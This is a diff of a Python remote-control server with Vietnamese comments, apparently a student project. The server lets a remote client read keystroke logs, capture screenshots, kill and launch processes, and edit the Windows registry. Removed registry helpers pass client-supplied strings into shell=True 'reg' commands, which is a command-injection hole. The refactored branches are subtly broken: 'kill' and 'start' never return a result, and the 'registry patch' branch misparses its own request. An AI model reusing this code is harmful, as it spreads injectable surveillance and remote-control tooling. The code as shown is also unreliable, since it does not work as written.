@@ -7,6 +7,9 @@ import threading  # Để tạo và quản lý luồng xử lý đồng thời
 import subprocess  # Để thực hiện các lệnh hệ thống
 from PIL import ImageGrab  # Để chụp màn hình
 from keylogger import Keylogger  # Module tự viết để ghi nhận các phím được đánh trên máy tính
+from screenshot import Screenshot
+from processus import ProcessManager
+from registry import RegistryManager
 from shutdown import ServerShutdownWindow  # Module tự viết để tạo cửa sổ tắt máy
 import psutil  # Thư viện quản lý thông tin về quá trình và tài nguyên hệ thống
 
@@ -99,10 +102,9 @@ class Server:
             logs = self.keylogger.read_log()
             return logs
         elif request == "screenshot":
-            # Thực hiện chụp màn hình và gửi hình ảnh về máy khách
-            screenshot = self.capture_screenshot()
-            client_socket.sendall(str(len(screenshot)).encode())  # Gửi kích thước trước
-            client_socket.sendall(screenshot)  # Gửi dữ liệu hình ảnh
+            screenshot_data = Screenshot.capture_screenshot()
+            client_socket.sendall(str(len(screenshot_data)).encode())  # Gửi kích thước trước
+            client_socket.sendall(screenshot_data)  # Gửi dữ liệu hình ảnh
             return None  # Không cần trả về gì ở đây (gửi hình ảnh rồi)
         elif request == "shutdown":
             # Hiển thị cửa sổ tắt máy chủ và thực hiện tắt máy chủ khi cần
@@ -117,124 +119,62 @@ class Server:
             self.handle_processus_request(client_socket)
             # return "Progress information has been sent"
         elif request.startswith("kill"):
-            try:
-                _, pid_str = request.split(" ", 1)  # Tách lệnh và PID
-                pid = int(pid_str)  # Chuyển PID thành số nguyên
-                return self.kill(pid)  # Tiến hành kết thúc tiến trình với PID đã chỉ định
-            except ValueError:
-                return "Invalid PID."
+                _, pid_str = request.split(" ", 1)
+                pid = int(pid_str)
+                response = ProcessManager.kill_process(pid)
         elif request.startswith("start"):
-            try:
-                _, app_name = request.split(" ", 1)  # Tách lệnh và tên ứng dụng
-                subprocess.Popen(["start", app_name], shell=True)  # Khởi chạy ứng dụng
-                return f"Started application: {app_name}"
-            except ValueError:
-                return "Invalid application name."
+                _, app_name = request.split(" ", 1)
+                response = ProcessManager.start_process(app_name)
         elif request == "registry patch":
-            response = self.handle_registry_patch(client_socket)
-            return response
+            try:
+                _, patch_file_path = request.split(" ", 1)
+                response = RegistryManager.apply_registry_patch(patch_file_path)
+                return response
+            except ValueError:
+                return "Invalid registry patch request."
+
         elif request.startswith("get"):
             try:
-                _, key_path, value_name = request.split(" ", 2)  # Tách lệnh, đường dẫn, và tên giá trị
-                result = self.get_registry_value(key_path, value_name)
+                _, key_path, value_name = request.split(" ", 2)
+                result = RegistryManager.get_registry_value(key_path, value_name)
                 return result
             except ValueError:
                 return "Invalid get request."
+
         elif request.startswith("set"):
             try:
-                _, key_path, value_name, value_data, value_type = request.split(" ", 4)  # Tách lệnh, đường dẫn, tên giá trị, dữ liệu giá trị, và kiểu giá trị
-                result = self.set_registry_value(key_path, value_name, value_data, value_type)
+                _, key_path, value_name, value_data, value_type = request.split(" ", 4)
+                result = RegistryManager.set_registry_value(key_path, value_name, value_data, value_type)
                 return result
             except ValueError:
                 return "Invalid set request."
+
         elif request.startswith("delete"):
             try:
-                _, key_path, value_name = request.split(" ", 2)  # Tách lệnh, đường dẫn, và tên giá trị
-                result = self.delete_registry_value(key_path, value_name)
+                _, key_path, value_name = request.split(" ", 2)
+                result = RegistryManager.delete_registry_value(key_path, value_name)
                 return result
             except ValueError:
                 return "Invalid delete request."
+
         elif request.startswith("create_key"):
             try:
-                _, key_path = request.split(" ", 1)  # Tách lệnh và đường dẫn khóa
-                result = self.create_registry_key(key_path)
+                _, key_path = request.split(" ", 1)
+                result = RegistryManager.create_registry_key(key_path)
                 return result
             except ValueError:
                 return "Invalid create_key request."
+
         elif request.startswith("delete_key"):
             try:
-                _, key_path = request.split(" ", 1)  # Tách lệnh và đường dẫn khóa
-                result = self.delete_registry_key(key_path)
+                _, key_path = request.split(" ", 1)
+                result = RegistryManager.delete_registry_key(key_path)
                 return result
             except ValueError:
                 return "Invalid delete_key request."
         else:
             return "Invalid request."
-    #create, delete key registry
-    def create_registry_key(self, key_path):
-        try:
-            # Sử dụng subprocess để chạy reg add để tạo khóa trong Registry
-            command = f'reg add "{key_path}" /f'
-            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-
-            if result.returncode == 0:
-                return f"Registry key {key_path} created successfully."
-            else:
-                return result.stderr
-        except Exception as e:
-            return f"Error creating registry key: {str(e)}"
-
-    def delete_registry_key(self, key_path):
-        try:
-            # Sử dụng subprocess để chạy reg delete để xóa khóa khỏi Registry
-            command = f'reg delete "{key_path}" /f'
-            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-
-            if result.returncode == 0:
-                return f"Registry key {key_path} deleted successfully."
-            else:
-                return result.stderr
-        except Exception as e:
-            return f"Error deleting registry key: {str(e)}"
-    #get,setcreate value registry
-    def get_registry_value(self, key_path, value_name):
-        try:
-            # Sử dụng subprocess để chạy reg query để lấy giá trị từ Registry
-            command = f'reg query "{key_path}" /v "{value_name}"'
-            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-
-            if result.returncode == 0:
-                return result.stdout
-            else:
-                return result.stderr
-        except Exception as e:
-            return f"Error getting registry value: {str(e)}"
-
-    def set_registry_value(self, key_path, value_name, value_data, value_type):
-        try:
-            # Sử dụng subprocess để chạy reg add để thiết lập giá trị trong Registry
-            command = f'reg add "{key_path}" /v "{value_name}" /d "{value_data}" /t {value_type} /f'
-            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-
-            if result.returncode == 0:
-                return f"Registry value {value_name} set successfully."
-            else:
-                return result.stderr
-        except Exception as e:
-            return f"Error setting registry value: {str(e)}"
-
-    def delete_registry_value(self, key_path, value_name):
-        try:
-            # Sử dụng subprocess để chạy reg delete để xóa giá trị khỏi Registry
-            command = f'reg delete "{key_path}" /v "{value_name}" /f'
-            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-
-            if result.returncode == 0:
-                return f"Registry value {value_name} deleted successfully."
-            else:
-                return result.stderr
-        except Exception as e:
-            return f"Error deleting registry value: {str(e)}"
+    
     # handle registry patch
     def handle_registry_patch(self, client_socket):
         try:
@@ -249,11 +189,16 @@ class Server:
                 registry_data += chunk
 
             # Lưu dữ liệu vào tệp tin registry
-            with open(os.path.join(self.cache_path, "registry.reg"), "wb") as reg_file:
+            patch_file_path = os.path.join(self.cache_path, "registry.reg")
+            with open(patch_file_path, "wb") as reg_file:
                 reg_file.write(registry_data)
 
+            # Áp dụng patch Registry bằng cách sử dụng RegistryManager
+            
+            response = RegistryManager.apply_registry_patch(patch_file_path)
+
             print("Đã nhận và lưu registry patch thành công.")
-            return "Registry patch applied successfully."
+            return response
 
         except Exception as e:
             print(f"Lỗi xử lý registry patch: {str(e)}")
@@ -273,24 +218,7 @@ class Server:
         except psutil.NoSuchProcess:
             # Xử lý ngoại lệ nếu không tìm thấy tiến trình với PID đã cho
             return "Process not found."
-    
-    # screenshot   
-    def capture_screenshot(self):
-        try:
-            # Chụp màn hình bằng cách sử dụng phương thức grab() từ thư viện ImageGrab
-            screenshot = ImageGrab.grab()
-            
-            # Tạo một đối tượng BytesIO để lưu trữ dữ liệu hình ảnh dưới dạng bytes
-            image_byte_array = io.BytesIO()
-            
-            # Lưu hình ảnh chụp màn hình vào đối tượng BytesIO với định dạng PNG
-            screenshot.save(image_byte_array, format="PNG")
-            
-            # Trả về dữ liệu hình ảnh dưới dạng bytes
-            return image_byte_array.getvalue()
-        except Exception as e:
-            # Xử lý ngoại lệ nếu có lỗi trong quá trình chụp màn hình
-            return f"Error capturing screenshot: {str(e)}"
+   
     
     # running process
     def get_running_processus(self):
@@ -348,7 +276,7 @@ class Server:
 
     def handle_processus_request(self, client_socket):
         try:
-            processes = self.get_running_processus()
+            processes = ProcessManager.get_running_processus()
             response = json.dumps(processes)
 
             # Chia dữ liệu thành các gói tin có kích thước nhỏ
